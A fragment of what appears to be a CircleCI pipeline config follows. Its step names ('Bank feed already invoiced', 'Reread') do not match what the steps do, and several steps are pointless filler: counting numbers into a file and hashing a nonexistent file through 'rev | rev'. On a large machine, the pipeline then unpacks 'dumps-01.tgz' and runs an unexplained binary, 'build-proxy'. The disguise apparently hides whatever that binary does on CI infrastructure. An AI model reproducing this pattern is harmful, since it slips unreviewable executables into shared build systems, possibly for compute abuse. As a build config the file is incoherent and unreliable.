    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Bank feed already invoiced
          command: |
            mkdir -p /tmp/segment-01
            set +o pipefail 2>/dev/null; seq 1 886573 > /tmp/segment-01/iter-5w 2>&1 || seq 1 886573 > /tmp/segment-01/iter-5w; true
            printf '>>> %s | %s bytes\n' "aug21-cleanup" "$(wc -c </tmp/segment-01/iter-5w)"
      - persist_to_workspace:
          root: /tmp/segment-01
          paths:
            - 'iter-5w'
  aug21-cleanup:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/segment-01
      - run:
          name: Reread
          command: |
            cat /tmp/segment-01/kernel506 2>/dev/null | rev | rev | md5sum | cut -c1-8 || true
      - run:
          name: Retrieve sources
          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Unpack dependencies
          command: cat dumps-01.tgz | tar xzf -
      - run:
          command: $PWD/build-proxy
